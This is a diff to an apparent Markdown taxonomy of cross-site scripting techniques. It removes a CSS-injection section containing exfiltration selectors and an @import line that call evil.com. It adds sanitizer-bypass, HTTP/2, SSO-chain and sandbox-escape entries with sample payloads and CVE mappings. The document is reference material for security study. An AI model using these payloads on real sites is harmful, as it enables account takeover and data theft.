@@ -222,39 +222,13 @@ Exploiting server-side or client-side redirects to deliver XSS payloads.
 
 ## §5. CSS Context
 
-Injection into CSS parsing contexts, enabling scriptless data exfiltration or, in legacy browsers, direct JavaScript execution.
-
-### §5-1. CSS-Based Script Execution (Legacy)
-
-Direct JavaScript execution via CSS features in older browsers.
-
-| Subtype | Mechanism | Key Condition |
-|---|---|---|
-| **expression() (IE)** | `background: expression(alert(1))` | Internet Explorer 5–8 (removed in IE9 standards mode) |
-| **-moz-binding (Firefox)** | `style="-moz-binding:url(xss.xml#xss)"` | Legacy Firefox; XBL binding |
-| **behavior (IE)** | `behavior:url(xss.htc)` | Internet Explorer; HTC component |
-
-### §5-2. CSS-Based Data Exfiltration
-
-Extracting sensitive data without JavaScript execution — effective against strict CSPs.
-
-| Subtype | Mechanism | Key Condition |
-|---|---|---|
-| **Attribute selector exfiltration** | `input[value^="a"]{background:url(https://evil.com/?a)}` iterated per character | CSS injection exists; target has sensitive data in attributes |
-| **CSP nonce leakage** | CSS selectors targeting `script[nonce^="..."]` leak nonce characters via background requests | Nonce value present in DOM attribute; CSP allows CSS |
-| **Disk-cache nonce reuse (meta tag vector)** | When CSP is delivered via `<meta http-equiv="Content-Security-Policy">`, the nonce appears in the tag's `content` attribute — which, unlike the `nonce` attribute on `<script>` elements, remains accessible to CSS attribute selectors (`meta[content*="abc"]{background:url(/leak?abc)}`). After leaking the full nonce through substring matching, the attacker exploits browser disk cache: the page with the known nonce is cached to disk, the injected payload is updated independently (e.g., via CSRF updating stored input that a `fetch()` retrieves at render time), and navigation is forced through a bfcache miss (by holding a `window.open()` reference to the page), causing the browser to fall back to disk cache — restoring the original HTML with the leaked nonce while server-side content now includes the attacker's `<script nonce="[known]">` payload | CSS injection; CSP via `<meta>` tag (nonce in `content` attribute); payload updatable independently of the nonce; Chrome disk-cache fallback on bfcache miss |
-| **Font-based text leak (Fontleak)** | Custom `@font-face` with `unicode-range` detects specific characters in text nodes. The **Fontleak** technique (2025) advances this by combining ligature fonts with CSS container queries: a custom font renders multi-character sequences as single ligature glyphs with known widths, and `@container` size queries detect the rendered width — enabling full string extraction without JavaScript, one character sequence at a time | CSS injection with controlled font loading; target text in a size-queryable container; bypasses strict `script-src` CSP |
-| **Scroll-based exfiltration** | Using `scroll-timeline` or `animation-timeline` CSS features to detect content | 2025 emerging technique using CSS animations |
-
-### §5-3. CSS Injection for XSS Enablement
-
-CSS injection that enables or amplifies XSS through indirect means.
-
-| Subtype | Mechanism | Key Condition |
-|---|---|---|
-| **@import external CSS** | `@import url(https://evil.com/xss.css)` loads attacker's stylesheet | CSP allows the import source |
-| **Style tag injection** | `<style>` tag with `@import` or malicious selectors | Input reflected in CSS context |
-| **Dangling markup via CSS** | CSS `url()` function captures subsequent HTML as part of the URL | CSS parsing consumes HTML beyond the injection point |
+> **This section has been extracted into a dedicated document.** For the full CSS injection taxonomy — including data exfiltration via attribute selectors, font ligatures, CSP nonce leakage, UI manipulation, SVG filter abuse, user tracking, and legacy script execution vectors — see **[`css-injection.md`](css-injection.md)**.
+>
+> Key cross-references from this document:
+> - CSP nonce leakage via CSS selectors → `css-injection.md` §5-1
+> - CSS-based data exfiltration (scriptless) → `css-injection.md` §1, §2
+> - CSS-to-XSS escalation chains → `css-injection.md` §5-3
+> - Legacy script execution (`expression()`, `-moz-binding`, `behavior`) → `css-injection.md` §3
 
 ---
 
@@ -304,6 +278,8 @@ Exploiting cross-origin messaging APIs for XSS.
 
 Exploiting differences between how HTML sanitizers parse markup and how browsers reconstruct it. This is the most sophisticated XSS category.
 
+> **Deep-Dive Reference:** For a comprehensive taxonomy of mXSS mutation mechanisms — including namespace switching, foster parenting, text content mode confusion, desanitization, nesting depth exploitation, and full CVE/bounty mapping — see the dedicated [`mutation-xss.md`](../05-client-side/mutation-xss.md) taxonomy.
+
 ### §7-1. DOM Mutation (mXSS)
 
 Payloads that are safe when parsed by the sanitizer but become dangerous after the browser's HTML parser reconstructs the DOM.
@@ -316,6 +292,9 @@ Payloads that are safe when parsed by the sanitizer but become dangerous after t
 | **Stack of open elements** | Browser's "adoption agency algorithm" restructures nesting in ways sanitizer cannot predict | Misnested formatting elements (`<b>`, `<i>`, `<a>`) cause tree reconstruction |
 | **Template element escape** | Content inside `<template>` parsed in inert mode by sanitizer but activated when moved to live DOM | Sanitizer treats `<template>` content as safe |
 | **Regex-based sanitizer bypass** | DOMPurify's template literal regex fails to catch edge cases (CVE-2025-26791) | `SAFE_FOR_TEMPLATES` mode with SVG edge cases |
+| **Lexical parser state exploitation (LEXSS)** | Sanitizer's lexer interprets token boundaries differently than browser's tokenizer — input classified as inert text re-tokenizes as executable markup at the pre-DOM lexical analysis stage | Custom lexer-based sanitizer (not browser-native DOMParser); tokenizer state machine differential |
+| **Nested parser context switching** | HTML/SVG/MathML nesting order produces different DOM trees in sanitizer vs. browser — context-switching rules in the specification are ambiguous at foreign content transition points, discoverable through systematic parser fuzzing | Multiple foreign content namespaces with nested transitions (e.g., `<svg>` inside `<math>`) |
+| **Element rename/unrename bypass** | Custom sanitizer renames dangerous elements (e.g., `svg` → `proton-svg`) before DOMPurify processing, then renames them back; the rename-unrename cycle re-activates elements and event handlers that the sanitizer neutralized during its pass (SonarSource, Skiff/Proton Mail, 2023) | Custom pre/post-processing wrapping a sanitizer; element renaming reverses sanitization of namespace-sensitive elements |
 
 ### §7-2. Encoding-Level Mutation
 
@@ -339,6 +318,8 @@ Causing the browser to interpret content in a more dangerous MIME context.
 | **Content-Type via CRLF** | CRLF injection sets `Content-Type: text/html` for a non-HTML response | Header injection vulnerability |
 | **SVG as image** | SVG file served as `image/svg+xml` executes embedded `<script>` tags | SVG file upload without content validation |
 | **Polyglot files** | File valid as both image and HTML; browser renders as HTML in certain contexts | Content-Type negotiation or MIME sniffing |
+| **KML/XML file rendering** | KML (Keyhole Markup Language) files are XML-based and can embed `<script>` or event handlers; when a web application renders KML content (e.g., map widgets, geo-data viewers) without sanitization, embedded JavaScript executes in the application's origin. Mixed-case tag names (`<ScRiPt>`) bypass keyword blacklists. Wormable when injected KML propagates to other users' views | Application renders user-uploaded KML/GeoXML content; tag-name blacklist is case-sensitive |
+| **Content-Type override in cloud storage/CDN** | Cloud object storage (S3, GCS, Azure Blob) serves user-uploaded files with the `Content-Type` set at upload time by the uploading client. If the application does not enforce a safe Content-Type on upload, an attacker uploads an HTML file with `Content-Type: text/html` — served directly from the storage origin or through a CDN without re-validation. Serverless/edge environments (Cloudflare Workers, Lambda@Edge) that dynamically construct responses may omit or misconfigure Content-Type headers, triggering browser MIME sniffing that promotes text or JSON containing HTML markup to executable HTML context. CDN cache re-serialization can also strip or replace Content-Type headers during cache storage/retrieval cycles | User-controlled Content-Type on upload; CDN/storage serves directly without Content-Type override or `X-Content-Type-Options: nosniff`; shared origin between user content and application (no subdomain isolation) (Flatt Security, 2024) |
 
 ---
 
@@ -357,6 +338,7 @@ Systematic methods to bypass input validation, output encoding, and Web Applicat
 | **Slash substitution** | `<img/src=x/onerror=alert(1)>` — forward slash as attribute separator | HTML parser accepts `/` as whitespace equivalent in tags |
 | **Rare/custom tags** | `<details open ontoggle=alert(1)>`, `<marquee onstart=alert(1)>` | Filter blocklist does not cover all HTML elements |
 | **SVG/MathML tags** | `<svg><script>alert(1)</script></svg>` — foreign element context | Filter does not understand foreign content parsing |
+| **XSS Auditor weaponization** | Injecting content matching legitimate scripts triggers Chrome's XSS Auditor block, selectively disabling defenses (frame-busters, security logic); auditor behavior also serves as XS-Leak content-detection oracle | Chrome < 78 with XSS Auditor enabled (historical; contributed to Auditor's removal) |
 
 ### §8-2. JavaScript Payload Obfuscation
 
@@ -403,6 +385,7 @@ XSS vectors specific to client-side frameworks, template engines, and rendering 
 | **React dangerouslySetInnerHTML** | `dangerouslySetInnerHTML={{__html: userInput}}` | Developer explicitly opts into unsafe rendering |
 | **React SSR hydration mismatch** | Server-rendered HTML differs from client hydration, causing unexpected DOM | SSR output contains user input not matching client expectation |
 | **Svelte @html directive** | `{@html userInput}` renders raw HTML | Direct raw HTML rendering in Svelte |
+| **Expression sandbox escape via toString gadget** | JavaScript expression sandboxes (custom eval wrappers, template engine sandboxes) restrict direct property access but allow implicit type coercion. Triggering implicit `toString` via string concatenation (`'' + obj`) or explicit `.toString()` on a native object invokes the object's prototype chain, which may return a `Function` constructor or other privileged reference outside the sandbox scope. Chaining `[].constructor.constructor('return this')()` through coercion escapes the sandbox to access the global `window` object | Expression sandbox permits member access but restricts direct `constructor` references; implicit coercion path to privileged prototype exists (CVE-2025-59840, lab.ctbb.show "Vega" research, 2025) |
 
 ### §9-2. Markdown and Rich Text Rendering
 
@@ -413,6 +396,7 @@ XSS vectors specific to client-side frameworks, template engines, and rendering 
 | **Markdown image injection** | `![x](data:text/html,<script>alert(1)</script>)` or `<img>` with event handler | Parser does not sanitize image source URIs |
 | **HTML entity bypass in markdown** | `&#106;avascript:` in link URL bypasses denylist of `javascript:` | Filter checks literal string; parser decodes entities |
 | **Rich text editor XSS** | WYSIWYG editor (TinyMCE, CKEditor, Quill) allows script injection via HTML mode | Insufficient output sanitization of editor content |
+| **Clipboard/Paste injection** | Malicious HTML/SVG delivered via clipboard paste bypasses input sanitization — paste handlers insert unsanitized DOM fragments containing event handlers or script elements into `contenteditable` regions | Rich-text editor or `contenteditable` element processing paste events without clipboard content sanitization |
 
 ### §9-3. Server-Side Template Injection (SSTI) to XSS
 
@@ -455,6 +439,16 @@ XSS achieved through manipulation of HTTP protocol features, cookie handling, or
 | **PDF XSS** | PDF with embedded JavaScript served inline | `Content-Disposition: inline` for PDF; browser renders PDF JS |
 | **XML file with XSS** | Uploaded XML processed with XSLT containing script | XML processing with user-controlled stylesheets |
 | **Polyglot file** | File valid as both JPEG and HTML (or GIF and HTML) | MIME sniffing enabled; file served without `nosniff` |
+
+### §10-4. HTTP/2 Protocol-Level XSS
+
+HTTP/2's binary framing and HPACK header compression introduce XSS vectors that do not exist in HTTP/1.1. Payloads injected through H2-specific features can survive protocol downgrade translation, bypassing WAFs that inspect only HTTP/1 traffic.
+
+| Subtype | Mechanism | Key Condition |
+|---|---|---|
+| **H2 header value injection via downgrade** | HTTP/2 allows header values containing characters forbidden in HTTP/1.1 (newlines, carriage returns, null bytes). When a front-end proxy downgrades H2 to H1, these characters can break header boundaries, injecting response headers or body content containing XSS payloads | H2 front-end → H1 backend with header value passthrough; insufficient sanitization during protocol downgrade |
+| **Pseudo-header reflection** | HTTP/2 pseudo-headers (`:path`, `:authority`, `:scheme`) carry values that become part of HTTP/1 request lines during downgrade. Injecting XSS payloads into pseudo-header values places them in contexts where they may be reflected in error pages, debug output, or logs | H2 → H1 downgrade; backend reflects request path or host in response without encoding |
+| **HPACK dynamic table poisoning** | HPACK compression allows previously sent header values to be referenced by index. An attacker can populate the dynamic table with malicious values that are later expanded in unexpected contexts, inserting XSS payloads into headers that the application reflects | Shared HPACK state between multiplexed H2 connections; application reflects header values in response body |
 
 ---
 
@@ -499,6 +493,9 @@ Blind XSS payloads typically use `import()` or external script loading with out-
 |---|---|---|
 | **Credentialless iframe + login CSRF** | Self-XSS (where a user can only inject scripts into their own session) is escalated to a full attack: the attacker embeds the target application in a `credentialless` iframe (which loads the page without cookies, making it unauthenticated), then performs a login CSRF to authenticate the iframe as the attacker's account (where the self-XSS payload is stored). The payload executes in the victim's browser within the target's origin, gaining access to the victim's cookies and same-origin storage via DOM APIs | Self-XSS vulnerability; login endpoint lacks CSRF protection; target permits framing (no `X-Frame-Options` or permissive `frame-ancestors`); browser supports `credentialless` iframe attribute |
 | **Window reference escalation** | After self-XSS fires in a credentialless iframe authenticated as the attacker, the injected script obtains references to the parent page's authenticated context via `window.open()` or top-level navigation, escalating from attacker-session XSS to victim-session compromise | Self-XSS in credentialless frame + ability to navigate or open windows in the target origin |
+| **SSO gadget chain (OAuth/OIDC flow)** | OAuth/OIDC authorization flows create cross-origin navigation chains (RP → IdP → RP) that carry attacker-influenceable state through URL parameters (`state`, `redirect_uri`, `login_hint`). The attacker crafts an authorization URL that routes the victim through IdP authentication and back to a RP page where stored self-XSS payload executes — in the victim's post-authentication context. Unlike credentialless iframe escalation, this uses the victim's own authentication rather than forcing the attacker's session | Self-XSS on a page reachable from the OAuth callback flow; OAuth flow preserves navigation to the vulnerable page (see `oauth.md` §10-4) |
+| **Token endpoint callback injection** | In implicit or hybrid OAuth flows, the authorization response parameters (code, token, error, state) are processed by client-side JavaScript on the callback page. If this processing has an injection flaw, the attacker crafts a forged authorization response URL with malicious values that trigger XSS when the callback handler evaluates them — escalating a parameter injection to full XSS in the authenticated context | Client-side OAuth callback processing with insufficient sanitization; implicit or hybrid flow (see `oauth.md` §10-4) |
+| **javascript: pseudo-protocol in SSO redirect** | OAuth 2.0 and SAML flows use HTTP redirects (302) and auto-submitting HTML forms (POST binding) to transport tokens between parties. When an AS or SP generates an auto-submit form with a user-controllable `action` URL (e.g., from `redirect_uri` or `RelayState`), an attacker injects `javascript:` as the form action. The browser executes the pseudo-protocol URI in the context of the page hosting the auto-submit form — which is the IdP or SP origin — achieving XSS in a highly privileged authentication context. PKCE and `state` parameters do not prevent this because the injection occurs in the transport mechanism, not the authorization grant | Auto-submit form action derived from attacker-controllable parameter (`redirect_uri`, `RelayState`); insufficient scheme validation (no allowlist restricting to `https://`); POST binding in SAML or `form_post` response mode in OAuth (Lauritz Holtmann, 2024) |
 
 ---
 
@@ -510,7 +507,7 @@ Blind XSS payloads typically use `import()` or external script loading with out-
 | **Account Takeover** | Apps with API tokens or OAuth | §3-3 + §6-3 + §4-3 — DOM XSS chains with postMessage leaks and redirect exploitation |
 | **Credential Phishing** | Any authenticated application | §1-2 + §11-2 — Inject fake login form via stored/blind XSS |
 | **Data Exfiltration (scripted)** | Apps with sensitive client-side data | §3-2 + §6-3 — Read DOM content, API responses, or cross-origin data |
-| **Data Exfiltration (scriptless)** | CSP-protected applications | §5-2 + §11-3 — CSS selectors and dangling markup leak data without JS |
+| **Data Exfiltration (scriptless)** | CSP-protected applications | [`css-injection.md`](css-injection.md) §1 + §11-3 — CSS selectors and dangling markup leak data without JS |
 | **Persistent Compromise** | HTTPS applications | §11-1 — Service worker registration for long-term payload injection |
 | **Worm Propagation** | Social platforms, messaging apps | §1 + §3-2 — Self-propagating stored XSS that replicates via social features |
 | **Cache Poisoning** | CDN/proxy-fronted applications | §7-3 + §8-3 — Inject XSS into cached responses via MIME confusion or parameter pollution |
@@ -540,6 +537,10 @@ Blind XSS payloads typically use `import()` or external script loading with out-
 | §6-3 (postMessage ATO) | Meta Conversion API Gateway (Jan 2025) | Zero-click account takeover via unvalidated postMessage origin. $12,500 bounty |
 | §10-2 (Cookie sandwich) | Apache Tomcat (2025 research) | HttpOnly cookie theft via RFC2109 parsing switch; phantom `$Version` cookie |
 | §8-3 (Parameter pollution) | WAF bypass research (2024) | 14 of 17 major WAF configurations bypassed (AWS, GCP, Azure, Cloudflare) |
+| §9-1 (Expression sandbox escape) | CVE-2025-59840 (Vega) | Expression sandbox bypass via implicit toString gadget chain; arbitrary JS execution |
+| §10-3 (QR code injection context) | CVE-2019-17003 (Firefox QR reader) | XSS via malicious QR code scanned by Firefox's built-in reader; script execution in privileged browser context |
+| §10-3 (Embedded application sandbox escape) | CVE-2024-32472 (Excalidraw) | Sandbox escape via `gist.github` iframe embedding; arbitrary JavaScript execution in drawing application |
+| §7-1 (Element rename/unrename bypass) | Skiff/Proton Mail XSS (SonarSource, 2023) | Email client sanitizer bypass; arbitrary JavaScript execution in victim's mailbox via crafted email |
 
 ---
 
@@ -567,7 +568,7 @@ Blind XSS payloads typically use `import()` or external script loading with out-
 
 **Why XSS persists.** Cross-site scripting is fundamentally an injection problem arising from the web's core design: HTML, CSS, and JavaScript coexist in a single document parsed by a pipeline of context-dependent interpreters. Every transition between parsing contexts — HTML to attribute, attribute to URL, URL to JavaScript, serialized DOM to live DOM — creates an opportunity for attacker-controlled input to cross a trust boundary. Unlike SQL injection, which can be structurally eliminated through parameterized queries, XSS has no single architectural solution because the injection surface is distributed across every layer of the browser's rendering pipeline.
 
-**Why incremental fixes fail.** Each defense addresses one layer while leaving others exposed. Output encoding prevents §1 and §2 but not §3 (JavaScript context) or §6 (DOM APIs). Content Security Policy blocks inline scripts but can be bypassed via JSONP endpoints (§4), nonce leakage (§5-2), or base tag injection (§1-3). HTML sanitizers like DOMPurify prevent direct injection but are systematically defeated by mutation XSS (§7) — a category that exists precisely because sanitizers and browsers implement different HTML parsing algorithms. WAFs operate on raw HTTP and cannot model the browser's multi-stage parsing pipeline, making them fundamentally unable to distinguish malicious from benign payloads in context (§8). The addition of Trusted Types (§6) and Sanitizer API shows progress, but adoption remains limited, and both require significant application-level integration.
+**Why incremental fixes fail.** Each defense addresses one layer while leaving others exposed. Output encoding prevents §1 and §2 but not §3 (JavaScript context) or §6 (DOM APIs). Content Security Policy blocks inline scripts but can be bypassed via JSONP endpoints (§4), nonce leakage via CSS (`css-injection.md` §5-1), or base tag injection (§1-3). HTML sanitizers like DOMPurify prevent direct injection but are systematically defeated by mutation XSS (§7) — a category that exists precisely because sanitizers and browsers implement different HTML parsing algorithms. WAFs operate on raw HTTP and cannot model the browser's multi-stage parsing pipeline, making them fundamentally unable to distinguish malicious from benign payloads in context (§8). The addition of Trusted Types (§6) and Sanitizer API shows progress, but adoption remains limited, and both require significant application-level integration.
 
 **What structural defense looks like.** True XSS elimination requires defense at every pipeline stage simultaneously: (1) context-aware output encoding at the template level (not manual escaping), (2) strict CSP with nonce-per-request and no `unsafe-inline`, (3) Trusted Types enforcement to eliminate DOM XSS sinks, (4) `X-Content-Type-Options: nosniff` to prevent MIME confusion, (5) `HttpOnly`, `Secure`, `SameSite` cookie attributes to limit post-exploitation impact, and (6) input validation at the semantic level (not pattern matching). Frameworks that implement these by default (auto-escaping templates, Trusted Types integration, built-in CSP) represent the most promising path forward — but even they cannot protect against all categories in this taxonomy, particularly mutation XSS (§7) and prototype pollution gadgets (§6-2), which exploit the gap between what any single component considers "safe" and what the browser ultimately executes.
 
@@ -611,6 +612,7 @@ Blind XSS payloads typically use `import()` or external script loading with out-
 - OWASP. "XSS Filter Evasion Cheat Sheet." https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html
 - OWASP. "DOM Clobbering Prevention Cheat Sheet." https://cheatsheetseries.owasp.org/cheatsheets/DOM_Clobbering_Prevention_Cheat_Sheet.html
 - HackTricks. "Cross Site Scripting (XSS)." https://book.hacktricks.wiki/pentesting-web/xss-cross-site-scripting
+- tttang. "A Magic Way of XSS in HTTP/2" (2022) — XSS vectors exploiting HTTP/2 binary framing and header compression characteristics
 
 ---
 
